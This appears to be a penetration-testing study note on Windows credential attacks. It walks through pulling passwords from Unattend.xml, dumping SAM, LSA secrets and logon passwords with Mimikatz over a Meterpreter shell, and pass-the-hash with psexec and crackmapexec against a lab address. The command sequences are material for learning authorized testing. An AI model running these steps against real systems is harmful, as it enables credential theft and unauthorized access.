<h4>Windows Password Hashes</h4>

The windows OS stores hashed user account passwords locally in the SAM(Security Accounts Manager) database

>Elevated/Administrative privileges are required in order to access and interact with the LSASS process

In modern version of windows the SAM database is encrypted with a syskey


<h4>Searching for passwords in windows configuration files</h4>

This is typically done through the use of the "Unattended Windows Setup utility", which is used to automate the mass installation/deployment of Windows on Systems

The unattended windows setup utility will typically utilize one of the following configuration files that contain user account and  system configuration information

1. "C:\Windows\Panther\Unattend.xml"
2. "C:\Windows\Panther\Autounattend.xml"

>As a security precaution, the passwords stored in the unattended windows setup configuration file may be encoded in base64

To search for the xml file
```
search -f Unattend.xml
```
the file is located in
```
C:\Windows\Panther
```
Download it to your machine
```
Download Unattend.xml
```
From here you can get a username and password. You can go ahead and use psexec to connect to the creds you found
```
psexec.py Administrator@10.10.10.10   //This requires a password
```



<h4>Dumping Hashes with Mimikatz</h4>

Mimikatz is a windows post exploitation tool. It can be used to extract hashes from "lsass.exe" process memory where hashes are cached

If you are on a meterpreter shell, you can utilize the mimikatz extension "kiwi".

>Mimikatz will require elevated privileges in order to run correctly

Migrate to the lsass.exe process
```
pgrep lsass
migrate 777
```
To use the kiwi extension
```
load kiwi
```
You can use the help menu to check for commands after loading the extension
```
help
```
To use the mimikatz executable, create a temp dir
```
cd C:\\
mkdir Temp
cd Temp
upload /usr/share/windows-resources/mimikatz/x64/mimikatz.exe
```
open a shell session
```
shell
```
execute the mimikatz executale
```
mimikatz.exe
```
Check if you have appropriate privileges
```
Privilege::debug //privilege '20' ok means you've got privileges
```
To dump for the sam database
```
lsadump::sam
```
To dump lsa secrte
```
lsadump::secret
```
To display logon passwords
```
sekurlsa::logonpasswords
```



<h4>Pass The Hash Attack</h4>

This is an exploitation technique that involved capturing or harvesting NTLM hashes or clear-text passwords and utilizing them to authenticate with the target legitimately

>Metasploit module PsExec

>Crackmapexec

Those 2 tools above can be used for this attack.

So you can reconnnect to the machine with the user's ntlm hash
```
crackmapexec smb 10.10.10.10 -u (username) -H "(NTLM hash)"
```
If this works, go ahead and execute a few command on it
```
crackmapexec smb 10.10.10.10 -u (username) -H "(NTLM hash)" -x "ipconfig"
```
